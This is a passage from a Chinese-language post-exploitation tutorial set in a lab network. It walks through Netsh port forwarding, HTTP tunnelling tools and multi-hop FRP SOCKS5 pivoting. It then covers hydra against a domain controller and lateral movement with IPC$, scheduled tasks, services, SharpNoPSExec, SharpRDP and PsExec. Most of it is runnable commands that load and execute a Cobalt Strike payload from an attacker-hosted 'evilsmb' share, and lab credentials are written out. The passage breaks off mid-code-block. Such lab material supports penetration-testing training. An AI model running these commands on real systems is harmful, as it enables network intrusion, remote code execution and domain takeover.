于是，我们可以在中间Web服务器上利用Netsh实现一个端口映射，只要我们访问中间Web服务器公网地址的指定端口，就相当于我们访问内网Web服务器的80端口。

```bash
netsh interface portproxy add v4tov4 listenaddress=WEB服务器 listenport=8080 connectaddress=内网主机 connectport=80 
#新建一个端口映射，将WEB服务器的8080端口和内网主机的80端口做个映射

netsh interface portproxy show all  #查看端口映射

netsh interface portproxy delete v4tov4 listenaddress=WEB服务器 listenport=8080 #删除端口映射
```



> 命令解析:
>
> `netsh interface portproxy add` : 在netsh接口下添加端口转发规则
>
> `v4tov4`: 指定转发的为IPV4到IPV4流量
>
> `listenaddress=WEB服务器`: 设置外网可以访问的WEB服务器地址
>
> `listenport=8080`: 设置在WEB服务器上监听的端口为8080
>
> `connectaddress=内网主机`: 设置要转发到的内网主机地址
>
> `connectport=80`: 设置要转发到内网主机的端口80

### 2.5.Netsh实现本地端口转发

现在我们有这么一个环境，我们获得了公网服务器的权限，并且获得了该服务器的账号密码。

但是3389端口被防火墙阻止，所以我们现在就需要做本地端口映射，将3389端口的流量映射到其他端口。

**该服务器的操作**

```bash
netsh interface portproxy add v4tov4 listenaddress=服务器IP listenport=13389 connectaddress=服务器IP connectport=3389
```

## 三.利用HTTP进行隧道穿透

### 3.1 Neo-reGeorg

Neo-reGeorg 是一款很实用的Web隧道工具。

它在 reGeorg 的基础上提高隧道的连接安全性.可用性.传输内容保密性，以应对更多的网络环境场景。它依赖Python3环境。  

1）Neo-reGeorg 支持 `aspx，jsp，php`三种语言，这里通过 webshell 将 `tunnel.php` 文件上传到Web服务器网站服务的根目录下，生成带有密码的服务器脚本文件。

执行下方命令生成文件，运行后会在当前目录下生成文件夹 `neoreg_servers`，该文件夹内会有各种环境下的脚本

```bash
python neoreg.py generate -k test
-k指定密码
```

2）将生成的文件上传到跳板web服务器，访问该文件

3）使用攻击机执行下方命令，此时隧道搭建成功

```bash
python neoreg.py -k test -u http://IP/tunnel.php -p 8888
#如果需要其他主机链接代理，需要添加 -l 0.0.0.0 参数
```

### 3.2 pivotnacci

`pivotnacci` 这款工具一样是通过HTTP来搭建隧道的，

它通过SOCKS代理，支持SOCKS 4，SOCKS 5两种协议，并且能为隧道加密，也是一款不错的隧道工具。 

1）下载完安装包并解压后先初始化，使用攻击机在 `pivotnacci-master` 文件夹下，执行下列命令来下载相关依赖库。

```bash
pip install -r requirements.txt
```

2）使用Python配置环境，执行下列命令来生成文件

```bash
python setup.py install
```

3）如果需要使用密码加密，可以在 `agents/agent.php` 文件中为 AGENT_PASSWORD 赋值。  

4）将 agent.php 放置在网站根目录下，在攻击机中执行下列命令，其中 -p 6666是指定端口，--password是指自定义密码。

```bash
./pivotnacci http://192.168.0.25/agent.php -p 6666 --password text -v
```



# FRP+proxychains

## FRP介绍

FRP是一个专注于内网穿透的高性能的反向代理应用，支持TCP、UDP、HTTP、HTTPS等协议，可以将内网服务以安全、便捷的方式，通过具有公网 IP 节点的中转暴露到公网。

在进行内网渗透中，FRP是一款常用的代理工具。

除此之外，FRP支持搭建`SOCKS5`代理应用。

FRP有 Windows 系统和 Linux 系统两个版本，

主要包含以下文件：

- frps，服务端程序，frps.ini，服务端配置文件；

- frpc，客户端程序；frpc.ini，客户端配置文件。


项目地址：[https://github.com/fatedier/frp](https://github.com/fatedier/frp)

## 实验环境介绍

### Vmware虚拟网卡配置展示

Vmware虚拟网卡配置下载链接：[https://pan.baidu.com/s/1wA8Ufcl4HjYKD7sGPMxW7g?pwd=e4ih](https://pan.baidu.com/s/1wA8Ufcl4HjYKD7sGPMxW7g?pwd=e4ih) 提取码：`e4ih`  

![](https://image.201068.xyz/assets/38.后渗透/1728985691851-7328773c-0e96-4fb4-ac5f-90ce0d7880b5.png)

### 资产展示

|             主机              |  服务类型  |                  IP 地址                  |
| :---------------------------: | :--------: | :---------------------------------------: |
|             kali              |    vps     |               192.168.10.2                |
| Windows Server 2012 （DMZ区） | Web 服务器 | IP1：192.168.10.10<br/>IP2：192.168.30.10 |
| Windows Server 2008 （DMZ区） | FTP 服务器 | IP1：192.168.30.11<br/>IP2：192.168.60.10 |
|      Windows 7（办公区）      |  办公电脑  | IP1：192.168.60.11<br/>IP2：192.168.90.10 |
| Windows Server 2012（核心区） |  域控制器  |               192.168.90.11               |

#### vmware网卡设置

![image-20241017111225267](https://image.201068.xyz/assets/38.后渗透/image-20241017111225267.png)

关闭**将主机虚拟适配器连接到此网络**

#### 禁用NAT模式

禁用掉所有NAT模式,避免路由转发

##### vps

> 192.168.10.2

![image-20241017112608950](https://image.201068.xyz/assets/38.后渗透/image-20241017112608950.png)

##### web服务器

> 192.168.10.10
>
> 192.168.30.10

![image-20241017110711873](https://image.201068.xyz/assets/38.后渗透/image-20241017110711873.png)

##### FTP 服务器

> 192.168.30.11
>
> 192.168.60.10

![image-20241017111619595](https://image.201068.xyz/assets/38.后渗透/image-20241017111619595.png)

##### 办公电脑

> 192.168.60.11
>
> 192.168.90.10

![image-20241017112034964](https://image.201068.xyz/assets/38.后渗透/image-20241017112034964.png)

##### 域控制器

> 192.168.90.11

![image-20241017112254223](https://image.201068.xyz/assets/38.后渗透/image-20241017112254223.png)

## 实验练习

### 一级代理

假设已经获取 Windows Server 2012 的控制权，经过信息收集，获取了 FTP 服务器的登录凭据，需要继续渗透并登录 FTP 服务器的远程桌面。

在 Windows Server 2012 上使用 FRP 搭建 SOCKS5 代理服务，通过 SOCKS5 代理连接到 FTP服务器。

#### ① 启动 FRP 服务端

使用 VPS 作为 FRP 服务端，在 VPS 上执行以下命令，启动 FRP 服务端程序

```bash
cd /root/tools/frp_0.45.0_linux_amd64/
./frps -c ./frps.ini
```

![image-20241017113321413](https://image.201068.xyz/assets/38.后渗透/image-20241017113321413.png)

##### frps.ini

服务端配置文件 frps.ini 的内容如下

```bash
vim /root/tools/frp_0.45.0_linux_amd64/frps.ini

[common]
bind_addr = 0.0.0.0	
bind_port = 7000
```

![image-20241017113252757](https://image.201068.xyz/assets/38.后渗透/image-20241017113252757.png)

#### ② 启动 FRP 客户端

使用 Windows Server 2012（Web 服务器）作为 FRP 客户端，

在 Windows Server 2012（Web 服务器）上执行以下命令启动 FRP 客户端程序

> frpc.exe -c frpc.ini

```bash
C:\Users\win2012\Desktop\frp_0.42.0_windows_amd64\frpc.exe -c C:\Users\win2012\Desktop\frp_0.42.0_windows_amd64\frpc.ini
```

![image-20241017113714525](https://image.201068.xyz/assets/38.后渗透/image-20241017113714525.png)

##### frpc.ini

客户端配置文件 frpc.ini 的内容如下

```bash
[common]
server_addr = 192.168.10.2
server_port = 7000

[socks5]
remote_port = 1080
plugin = socks5
```

![image-20241017113538120](https://image.201068.xyz/assets/38.后渗透/image-20241017113538120.png)

此时便成功在 Windows Server 2012（Web 服务器）与 VPS 之间搭建了一个 SOCKS5 代理服务。

然后，借助第三方工具，可以让计算机的其他应用使用这个 SOCKS5 代理，如 ProxyChains、Proxifier 等。

这里以 ProxyChains 为例进行演示

（ProxyChains是一款可以在Linux下实现全局代理的软件，可以使任何应用程序通过代理上网，允许TCP和DNS流量通过代理隧道，支持HTTP、SOCKS4、SOCK5类型代理）。

#### 配置proxychains

首先，编辑 ProxyChains 的配置文件 `/etc/proxychains4.conf`，

将 **SOCKS5 代理服务器的地址**指向 **FRP 服务端的地址**。

```bash
vim /etc/proxychains4.conf

socks5 127.0.0.1 1080
```

![image-20241017141804906](https://image.201068.xyz/assets/38.后渗透/image-20241017141804906.png)

#### 命令前加上 proxychains

然后，在命令前加上 "proxychains"，便可应用此 SOCKS5 代理。

```bash
proxychains rdesktop 192.168.30.11
```

![image-20241017142034142](https://image.201068.xyz/assets/38.后渗透/image-20241017142034142.png)

> win2008-x64\administrator / qwe.123

![image-20241017142246157](https://image.201068.xyz/assets/38.后渗透/image-20241017142246157.png)

### 二级网络代理

获得 DMZ 区域的 FTP 服务器控制权后，经过信息收集，发现还有一个网段为 192.168.30.0/24 的办公区网络，需要继续渗透并登录办公电脑的远程桌面。

用 FRP 在 DMZ 区与办公区之间搭建一个二级网络的 SOCKS5 代理，从而访问办公区的办公电脑。

#### ① kali启动 FRP 服务端

在 VPS 上执行以下命令，启动 FRP 服务端。

```bash
./frps -c ./frps.ini
```

##### frps.ini

服务端配置文件 frps.ini 的内容如下

```bash
[common]
bind_addr = 0.0.0.0	#在服务端上绑定的 IP 地址
bind_port = 7000	#在服务端上绑定的端口
```

#### ② win2012启动 FRP 客户端

在 Windows Server 2012（Web服务器） 上执行以下命令，启动 FRP 客户端，连接 VPS 的服务器

```bash
.\frpc.exe -c .\frpc.ini
```

##### frpc.ini

客户端配置文件 frpc.ini 的内容如下

```bash
[common]
server_addr = 192.168.10.2	#指向 FRP 服务端绑定的 IP 地址
server_port = 7000	#指向 FRP 服务端绑定的端口 

[socks5]
remote_port = 1080	#设置了本代理监听的端口号,此端口会映射到服务端。
plugin = socks5	#代理的类型
```

#### ③ win2012启动FRP 服务端

在 Windows Server 2012（Web服务器）上执行以下命令，启动一个 FRP 服务端

> frps.exe -c frps.ini

```bash
frps.exe -c frps.ini
```

![image-20241017142801454](https://image.201068.xyz/assets/38.后渗透/image-20241017142801454.png)

##### frps.ini

服务端配置文件 frps.ini 的内容如下

```bash
[common]
bind_addr = 192.168.30.10
bind_port = 7000
```

![image-20241017141041279](https://image.201068.xyz/assets/38.后渗透/image-20241017141041279.png)

#### ④ win2008启动 FRP 客户端

在 DMZ 区的 Windows Server 2008（FTP 服务器）上执行以下命令，启动 FRP 客户端，连接 Windows Server 2012（Web服务器）的服务端

> frpc.exe -c frpc.ini

```bash
frpc.exe -c frpc.ini
```

![image-20241017143230656](https://image.201068.xyz/assets/38.后渗透/image-20241017143230656.png)

##### frpc.ini

服务端配置文件 frpc.ini 的内容如下

```bash
[common]
server_addr = 192.168.30.10	
server_port = 7000	

[socks5]
type = tcp
remote_port = 1081	
plugin = socks5	
```

![image-20241017143204479](https://image.201068.xyz/assets/38.后渗透/image-20241017143204479.png)

#### 配置ProxyChains

到此，成功在 DMZ 区与办公区之间搭建了一个 SOCKS5 代理。同样，继续在 ProxyChains 配置文件最后一行添加下列内容

```bash
vim /etc/proxychains4.conf

socks5 192.168.30.10 1081
```

![image-20241017143356755](https://image.201068.xyz/assets/38.后渗透/image-20241017143356755.png)

#### 在命令前加上 proxychains

然后，在命令前加上 "proxychains"，便可应用此 SOCKS5 代理。

```bash
proxychains rdesktop 192.168.60.11
```

![image-20241017143536692](https://image.201068.xyz/assets/38.后渗透/image-20241017143536692.png)

![image-20241017143609971](https://image.201068.xyz/assets/38.后渗透/image-20241017143609971.png)

### 三级网络代理

入侵办公区后，经过信息收集，发现还有一个网段为 192.168.60.0/24 的核心区网络需要继续渗透并登录域控制器的远程桌面。

用FRP在DMZ区、办公区与核心区之间搭建一个三级网络的 SOCKS5 代理，从而访问核心区的域控制器。

#### ① kali启动 FRP 服务端

在VPS上执行以下命令，启动 FRP 服务端。

```bash
./frps -c ./frps.ini
```

##### frps.ini

服务端配置文件 frps.ini 的内容如下

```bash
[common]
bind_addr=0.0.0.0	#在VPS上的FRP服务端绑定的IP地址
bind_port=7000	#在VPS上的FRP服务端绑定的端口
```

#### ② win2012启动FRP客户端

在 Windows Server 2012（Web服务器）上执行以下命令，启动FRP客户端，连接VPS的服务端

```bash
.\frpc.exe -c .\frpc.ini
```

##### frpc.ini

客户端配置文件 frpc.ini 的内容如下

```bash
[common]
server_addr = 192.168.10.2	#指向 FRP 服务端绑定的 IP 地址
server_port = 7000	#指向 FRP 服务端绑定的端口 

[socks5]
remote_port = 1080	#设置了本代理监听的端口号,此端口会映射到服务端。
plugin = socks5	#代理的类型
```

#### ③ win2012启动FRP服务端

##### 在 Windows Server 2012（Web服务器）上执行以下命令，启动一个FRP服务端

```bash
.\frps.exe -c .\frps.ini
```

##### frps.ini

服务端配置文件 frps.ini 的内容如下

```bash
[common]
bind_addr = 192.168.30.10	#在 Windows Server 2012 上的 FRP 服务端绑定的 IP 地址
bind_port=7000	#在 Windows Server 2012 上的 FRP 服务端绑定的端口
```

#### ④ win2008启动 FRP 客户端

在 DMZ 区的 Windows Server 2008（FTP 服务器）上执行以下命令，启动 FRP 客户端，连接 Web 服务器上的 FRP 服务端

```bash
.\frpc.exe -c .\frpc.ini
```

##### frpc.ini

客户端配置文件 frpc.ini 的内容如下：

```bash
[common]
server_addr = 192.168.30.10	#指向 Windows Server 2012 上的 FRP 服务端绑定的 IP 地址
server_port = 7000	#指向 Windows Server 2012 上的 FRP 服务端绑定的端口

[socks5]
type = tcp
remote_port = 1081	#代理所使用的端口，会被转发到服务端
plugin = socks5	#代理的类型
```

#### ⑤ win2008启动FRP 服务端

##### 在DMZ区的 Windows Server 2008（FTP 服务器）上执行以下命令，启动一个 FRP 服务端

> frps.exe -c frps.ini

```bash
frps.exe -c frps.ini
```

![image-20241017143833273](https://image.201068.xyz/assets/38.后渗透/image-20241017143833273.png)

##### frps.ini

服务端配置文件frps.ini的内容如下：

```bash
[common]
bind_addr = 192.168.60.10
bind_port= 7000
```

![image-20241017143805056](https://image.201068.xyz/assets/38.后渗透/image-20241017143805056.png)

#### ⑥ win7启动 FRP 客户端

在办公区的 Windows 7（办公电脑）上执行以下命令，启动 FRP 客户端，连接 Windows Server 2008（FTP 服务器）的 FRP 服务端

> frpc.exe -c frpc.ini

```bash
frpc.exe -c frpc.ini
```

![image-20241017144635210](https://image.201068.xyz/assets/38.后渗透/image-20241017144635210.png)

##### frpc.ini

客户端配置文件frpc.ini的内容如下

```bash
[common]
server_addr = 192.168.60.10
server_port=7000

[socks5]
type = tcp
remote_port = 1082
plugin = socks5
```

到此，三级网络代理搭建完成。

![image-20241017144244489](https://image.201068.xyz/assets/38.后渗透/image-20241017144244489.png)

####  配置ProxyChains

同样，继续在 ProxyChains 配置文件的最后一行添加 "socks5 192.168.60.10 1082"

```bash
socks5 192.168.60.10 1082
```

![image-20241017144744809](https://image.201068.xyz/assets/38.后渗透/image-20241017144744809.png)

#### 在命令前加上 proxychains

执行以下命令，即可通过该 `socks5` 代理连接核心区域控的远程桌面。

```bash
proxychains rdesktop 192.168.90.11
```

![image-20241017145821936](https://image.201068.xyz/assets/38.后渗透/image-20241017145821936.png)

> wasj\administrator / Admin@123

![image-20241017145712610](https://image.201068.xyz/assets/38.后渗透/image-20241017145712610.png)

# FRP+Proxifier

## Proxifier介绍

Proxifier是一个知名的代理工具，它允许用户将网络应用程序通过代理服务器进行连接。

它本身只是一个代理管理的工具，可以设置和管理代理连接，但并不提供代理服务器。

## 下载地址

https://www.proxifier.com/

## 添加代理服务器

添加**frp代理服务器**的ip地址和socks5代理的端口号，协议版本选择为**socks5版本**

```bash
192.168.10.2 1080
192.168.30.10 1081
192.168.60.10 1082
```

![image-20241017152334946](https://image.201068.xyz/assets/38.后渗透/image-20241017152334946.png)

![image-20241017152600194](https://image.201068.xyz/assets/38.后渗透/image-20241017152600194.png)

![image-20241017152800803](https://image.201068.xyz/assets/38.后渗透/image-20241017152800803.png)

#### 添加代理链

![image-20241017153453286](https://image.201068.xyz/assets/38.后渗透/image-20241017153453286.png)

### windows攻击机ip

```bash
ipconfig
```

![image-20241017162112079](https://image.201068.xyz/assets/38.后渗透/image-20241017162112079.png)

> 192.168.10.4

## 添加规则

### 默认规则

默认有两条代理规则， 

第一个时系统程序的规则是Direct直连模式，不通过代理。

第二个是默认其他应用程序，都通过代理。

![image-20241017153557353](https://image.201068.xyz/assets/38.后渗透/image-20241017153557353.png)

### hydra

![image-20241017153927857](https://image.201068.xyz/assets/38.后渗透/image-20241017153927857.png)

> hydra.exe
>
> *
>
> 1-65535

![image-20241017154110244](https://image.201068.xyz/assets/38.后渗透/image-20241017154110244.png)

## hydra破解域控密码

```bash
hydra -l administrator -p Admin@123 192.168.90.11 smb
```

![image-20241017161434868](https://image.201068.xyz/assets/38.后渗透/image-20241017161434868.png)

> administrator / Admin@123

# 横向移动

横向移动是从一个受感染主机迁移到另一个受感染主机的过程。

一旦进入内部网络，攻击者就会将已被攻陷的机器作为跳板，继续访问或控制内网中的其他机器，直至获取机密数据或控制关键资产。

通过横行移动，攻击者最终可能获取域控制器的权限并接管整个域环境。

## 一.横向移动中的文件传输

### 1.1.通过网络共享

Windows系统中的网络共享功能可以实现局域网之间的文件共享。

通过提供有效的用户凭据，用户可以很轻松地将文件从一台机器传输到另一台机器。  

执行“`net share`”命令，获得Windows 系统默认开启的网络共享，其中 `C`为C盘共享，ADMIN 为系统目录共享，还有一个是IPC$共享。

```bash
net share
```

![image-20241017172015440](https://image.201068.xyz/assets/38.后渗透/image-20241017172015440.png)

`IPC` (Internet Process Connection)是共享 “命名管道” 的资源，为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。

利用当前所控主机与内网中的其他远程主机建立的网络共享连接，攻击者可以访问远程主机上的资源，如直接查看远程主机目录,在两台主机之间复制文件,读取远程主机上的文件等。

而实战中往往会建立 `IPC`连接。通过`IPC`连接，不仅可以进行所有文件共享操作，还可以实现其他远程管理操作，

如列出远程主机进程.在远程主机上创建计划任务或系统服务等，这在进行内网横向移动中起着至关重要的作用。 

#### 建立 IPC$ 连接需要具备以下两个条件

1. 远程主机开启了 IPC 连接（默认开启）

2. 远程主机的 139 端口和 445 端口开放

3. 知道对方机器的用户名和密码

#### 建立 IPC 连接

执行下列命令与远程主机建立 IPC 连接

```bash
net use \\192.168.70.32\ipc$ "qwe.123" /user:"Administrator"
net use \\win2008-x64.wasj.test\ipc$ "Admin@123" /user:wasj\Administrator

#删除链接
net use \\192.168.70.32\ipc$ /del

net use \\win2008-x64.wasj.test\ipc$ /del
```

![image-20241017172259766](https://image.201068.xyz/assets/38.后渗透/image-20241017172259766.png)

![image-20241017185556746](https://image.201068.xyz/assets/38.后渗透/image-20241017185556746.png)

#### 列出共享目录

连接成功后执行下列命令即可成功列出远程主机的 C 盘共享目录

```bash
dir \\192.168.70.32\C$
dir \\win2008-x64.wasj.test\C$
```

![image-20241017172137452](https://image.201068.xyz/assets/38.后渗透/image-20241017172137452.png)

![image-20241017185633951](https://image.201068.xyz/assets/38.后渗透/image-20241017185633951.png)

#### 复制文件

使用 “`copy`” 命令，可以通过共享连接向远程主机上复制文件，也可以将远程主机上的文件复制到本地，但需要注意**当前用户对远程目录的权限**。

实战中可以将**恶意文件上传到远程主机**，然后通过**其他远程执行的方法来运行**，

如创建**远程计划任务**或**服务**等。

```bash
copy 6666.exe \\192.168.70.32\C$
```

![image-20241017181810065](https://image.201068.xyz/assets/38.后渗透/image-20241017181810065.png)

![image-20241017181827824](https://image.201068.xyz/assets/38.后渗透/image-20241017181827824.png)

### 1.2.搭建 SMB 服务器

SMB（Server Message Block，服务消息块），又称 CIFS （Common Internet File System），

主要功能是使网络上的计算机能够共享计算机文件,打印机等资源。

SMB 消息一般通过`NetBIOS`协议或者TCP发送，分别使用 `139` 和 `445` 端口，目前倾向于使用 445 端口。

实战中可以在自己的服务器或当前所控内网主机上搭建SMB服务器，将需要横向传输的文件如攻击载荷等放入SMB服务器的共享目录，并指定UNC路径，让横向移动的目标主机远程加载SMB共享的文件。

注意，需使用**SMB匿名共享**，并且搭建的SMB服务器**能够被横向移动的目标所访问到**。

#### Linux搭建smb 服务

在Linux系统上，可以通过 `Impacket` 项目提供的 `smbserver.py` 来搭建SMB服务器。

执行以下命令，即可在搭建一个名为 `evilsmb`，共享目录指向 `/home/kali/share` 的SMB匿名共享。

```bash
mkdir /home/kali/share
impacket-smbserver evilsmb /home/kali/share -smb2support
```

![image-20241017181921248](https://image.201068.xyz/assets/38.后渗透/image-20241017181921248.png)

```bash
\\192.168.70.4
```

![image-20241017182020901](https://image.201068.xyz/assets/38.后渗透/image-20241017182020901.png)

```bash
\\192.168.70.4\evilsmb
```

![image-20241017182031101](https://image.201068.xyz/assets/38.后渗透/image-20241017182031101.png)

#### windows开启smb 服务

使用 `Invoke-BuildAnonymousSMBServer` 开启 smb 服务（Windows）

项目地址：[https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer](https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer)

下载链接：https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1

`cmd以管理员运行`

```bash
powershell
cd C:\Users\user\Desktop
mkdir c:\share

#开启SMB服务：
powershell -exec bypass -command "&{ import-module .\Invoke-BuildAnonymousSMBServer.ps1;Invoke-BuildAnonymousSMBServer -Path c:\share -Mode Enable}"

#木马放到c:\share目录
shell upload /root/tools/cobaltstrike/payload/6666.exe
shell move 6666.exe C:\share\6666.exe

#设置权限
icacls C:\share\6666.exe /T /grant Everyone:rx

#关闭SMB服务：
powershell -exec bypass -command "&{ import-module .\Invoke-BuildAnonymousSMBServer.ps1;Invoke-BuildAnonymousSMBServer -Path c:\share -Mode Disable}"
```

![image-20241017183146730](https://image.201068.xyz/assets/38.后渗透/image-20241017183146730.png)

![image-20241017184707834](https://image.201068.xyz/assets/38.后渗透/image-20241017184707834.png)

```bash
\\WIN7-X64\smb
```

![image-20241017184952569](https://image.201068.xyz/assets/38.后渗透/image-20241017184952569.png)

## 二.IPC$和计划任务配合横向

### 2.1.常规利用

测试人员可以通过建立 IPC 连接，向远程主机上传攻击载荷，然后在远程主机上**创建计划任务**，让目标主机**在规定的时间点或周期内执行特定操作**。

在拥有对方**管理员凭据**的条件下，可以**通过计划任务实现横向移动**，具体操作流程如下。 

####  创建计划任务

1. 1.利用**已建立的共享连接**向远程主机上传攻击载荷。  
2. 2.利用指定用户凭据的方式在远程主机上**创建计划任务**。

执行以下命令：

```bash
dir \\192.168.70.32\C$

schtasks /create /s 192.168.70.32 /u administrator /p qwe.123 /tn test /tr c:/6666.exe /sc onstart /RU System /F

schtasks /run /s 192.168.70.32 /u administrator /p qwe.123 /tn test
```

![image-20241017190202133](https://image.201068.xyz/assets/38.后渗透/image-20241017190202133.png)

![image-20241017190317032](https://image.201068.xyz/assets/38.后渗透/image-20241017190317032.png)

#### 创建计划任务执行命令

也可以通过创建计划任务在远程主机上执行命令，并将执行结果写入文件，然后通过 type 命令进行读取

```bash
schtasks /create /s 192.168.70.32 /u administrator /p qwe.123 /tn commond /tr "c:\windows\system32\cmd.exe /c 'whoami>c:\result.txt'" /sc onstart /RU System /F

schtasks /run /s 192.168.70.32 /u administrator /p qwe.123 /tn commond

type \\192.168.70.32\c$\result.txt
```

![image-20241017190547446](https://image.201068.xyz/assets/38.后渗透/image-20241017190547446.png)

### 2.2.UNC路径加载执行

Windows 系统中使用UNC路径来访问网络共享资源，格式如下：

> `\\servername\sharename\directory\filename`

- `servername` 是服务器主机名，
- `sharename` 是网络共享的名称，
- `directory` 和 `filename` 分别为该共享下的目录和文件。 

在远程主机上攻击载荷时，可以直接使用 **UNC 路径**代替常规的本地路径，让远程主机直接在测试人员搭建的 SMB 共享中加载攻击载荷并执行。

这样可以省去手动上传攻击载荷的步骤。

这里以计划任务为例进行演示，其他类似创建服务，PsExec，WMI，DCOM等远程执行方法都适用。  

#### 1.搭建 SMB 匿名共享服务

##### 启动SMB服务

测试人员在一台**可控的服务器**上执行下列命令搭建 SMB 匿名共享服务，并将生成的攻击载荷放入共享目录。

```bash
mkdir /home/kali/share
impacket-smbserver evilsmb /home/kali/share -smb2support
```

![image-20241017190714327](https://image.201068.xyz/assets/38.后渗透/image-20241017190714327.png)

##### 将生成的攻击载荷放入共享目录

```bash
cp /root/tools/cobaltstrike/payload/6666.exe /home/kali/share
```

![image-20241017191853201](https://image.201068.xyz/assets/38.后渗透/image-20241017191853201.png)

```bash
\\192.168.70.4\\evilsmb
```

![image-20241017191805648](https://image.201068.xyz/assets/38.后渗透/image-20241017191805648.png)

#### 2.创建计划任务执行远程共享文件

2.执行下列命令，在远程主机创建计划任务，使用 **UNC 路径**加载位于远程共享中的攻击载荷并执行

```bash
schtasks /create /s 192.168.70.32 /u administrator /p qwe.123 /tn test1 /tr \\192.168.70.4\evilsmb\6666.exe /sc onstart /RU System /F

schtasks /run /s 192.168.70.32 /u administrator /p qwe.123 /tn test1
```

![image-20241017192420081](https://image.201068.xyz/assets/38.后渗透/image-20241017192420081.png)

## 三.IPC$和服务的配合横向

### 3.1.常规利用

除了创建计划任务，测试人员还可以通过在远程主机上**创建系统服务**的方式，在程主机上运行指定的程序或命令。

该方式需要拥有两端主机的**管理员权限**和 `IPC$` 连接，具体操作如下。  

1. 利用已建立的共享连接向远程主机上传攻击载荷。
2. 利用已建立的IPC连接在远程主机上创建系统服务。

#### 远程创建服务

在建立`IPC`的情况下可以使用远程创建服务

```bash
#创建服务
sc \\192.168.70.32 create test2 binpath= "cmd.exe /c c:\6666.exe"

#开启服务
sc \\192.168.70.32  start test2

#删除服务
sc \\192.168.70.32  delete test2
```

![image-20241017193221967](https://image.201068.xyz/assets/38.后渗透/image-20241017193221967.png)

![image-20241017193142975](https://image.201068.xyz/assets/38.后渗透/image-20241017193142975.png)

![image-20241017193307204](https://image.201068.xyz/assets/38.后渗透/image-20241017193307204.png)

### 3.2.SharpNoPSExec利用

`SharpNoPSExec`会**查询所有服务**，**随机选择**一个启动类型为**禁用或手动**,当前状态为**停止**且具有`LocalSystem`权限的服务来重用它。

一旦选择服务，它将保存其当前状态，用攻击者选择的`payload`**替换其二进制路径**并执行它。

**等待5秒钟**后，它会恢复服务配置。

#### 上传

跳板机系统需要新一点，老的直接报错

```bash
upload /root/tools/domain/SharpNoPSExec.exe
```

![image-20241017194359097](https://image.201068.xyz/assets/38.后渗透/image-20241017194359097.png)

#### 利用

```bash
SharpNoPSExec.exe --target=192.168.70.32 --payload="c:\windows\system32\cmd.exe /c \\192.168.70.4\evilsmb\6666.exe" --username=administrator --password=qwe.123
```

![image-20241017195417809](https://image.201068.xyz/assets/38.后渗透/image-20241017195417809.png)

![image-20241017195524444](https://image.201068.xyz/assets/38.后渗透/image-20241017195524444.png)

## 四.远程桌面利用

远程桌面协议是微软从 Windows Server 2000 开始提供的功能，用户可以通过该功能登录并管理远程主机，所有操作就像在自己的计算机上操作一样。

远程桌面协议默认监听 TCP `3389` 端口。

 利用远程桌面进行横向移动是常见的方法。当内网中的其他主机开启了远程桌面服务后，测试人员可以通过已获取的用户凭据，借助内网代理等技术进行远程登录，通过远程桌面服务对目标主机进行实时操作。

但是这种方法可能将已登录的用户强制退出，容易被管理员发现。

### SharpRDP利用

SharpRDP 是一款开源工具，可以通过远程桌面协议在远程主机上执行系统命令，且不需 GUI 客户端。

该工具需要远程主机开启远程桌面功能，并且防火墙放行 3389 端口。通常在内网渗透时，如果想登录一台内网主机的远程桌面，需要先搭建内网代理，然后使用RDP客户端进行连接。

但是，测试人员可以直接将 `SharpRDP` 上传到跳板机，然后获取到的**用户凭据**，对内网其他主机执行系统命令。

这样就**省去了内网代理等中间环节**。

相关命令如下。

```bash
SharpRDP.exe computername=192.168.70.32 command="\\192.168.70.4\evilsmb\6666.exe" username=win2008-x64\administrator password=qwe.123 exec=cmd
```

![image-20241018092801713](https://image.201068.xyz/assets/38.后渗透/image-20241018092801713.png)

![image-20241018092735922](https://image.201068.xyz/assets/38.后渗透/image-20241018092735922.png)

## 五.PsExec远程控制

`PsExec` 是微软官方提供的一款实用的Windows远程控制工具，可以根据凭据在远程系统上执行管理操作，并且可以获得与命令行几乎相同的实时交互性。

PsExec最强大的功能之一就是可以在远程系统中启动交互式命令提示窗口，以便实时显示有关远程系统的信息。

PsExec 原理是通过 SMB 连接到服务端的 `Admin$` 共享，并释放名为“`psexesvc.exe`”的二进制文件，然后注册名为“`PSEXESVC`”服务。

当客户端执行命令时，服务端通过`PSEXESVC` 服务启动相应的程序执行命令并回显数据。

运行结束后，`PSEXESVC` 服务会被**删除**。

### PsExec远程操作条件

用 PsExec 进行远程操作需要具备以下条件：

1. ①远程主机开启了`Admins$`共享
2. ②远程主机启用`445`端口

### 启动system权限的cmd

```bash
psexec.exe -accepteula \\192.168.70.32 -u wasj.test\administrator -p qwe.123 -s cmd.exe

psexec.exe -accepteula \\192.168.70.32 -u wasj.test\administrator -p qwe.123 -s \\192.168.70.4\evilsmb\6666.exe

#如果已建立IPC$连接，可直接执行下方命令
psexec.exe -accepteula \\192.168.70.32 cmd.exe
```

> `-accepteula`：禁止弹出许可证对话框
>
> `-s`：以 system 权限启动进程

#### 运行cmd命令

```bash
psexec.exe -accepteula \\192.168.70.32 -u wasj.test\administrator -p qwe.123 -s cmd.exe
```

![image-20241018093552949](https://image.201068.xyz/assets/38.后渗透/image-20241018093552949.png)

![image-20241018093819688](https://image.201068.xyz/assets/38.后渗透/image-20241018093819688.png)

```bash
psexec.exe -accepteula \\192.168.70.32 cmd.exe
```

![image-20241018094356405](https://image.201068.xyz/assets/38.后渗透/image-20241018094356405.png)

#### 运行远程木马

```bash
psexec.exe -accepteula \\192.168.70.32 -u wasj.test\administrator -p qwe.123 -s \\192.168.70.4\evilsmb\6666.exe
```

![image-20241018094022223](https://image.201068.xyz/assets/38.后渗透/image-20241018094022223.png)

![image-20241018094000900](https://image.201068.xyz/assets/38.后渗透/image-20241018094000900.png)

### Impacket` 和 `Metasploit

`Impacket` 和 `Metasploit` 都内置了基于 `PsExec` 执行远程命令的脚本或者模块，

如 `Impacket` 的 `psexec.py` 脚本和 `Metasploit` 的 `exploit/windows/smb/psexec` 模块。

#### Impacket

##### kali

```bash
impacket-psexec administrator:"qwe.123"@192.168.70.32 cmd
```

![image-20241018161556631](https://image.201068.xyz/assets/38.后渗透/image-20241018161556631.png)

##### windows

###### 安装

```bash
pip install impacket
cd D:\environment\Python\Python311\Scripts
python psexec.py administrator:"qwe.123"@192.168.70.32 cmd
```

###### 使用

```bash
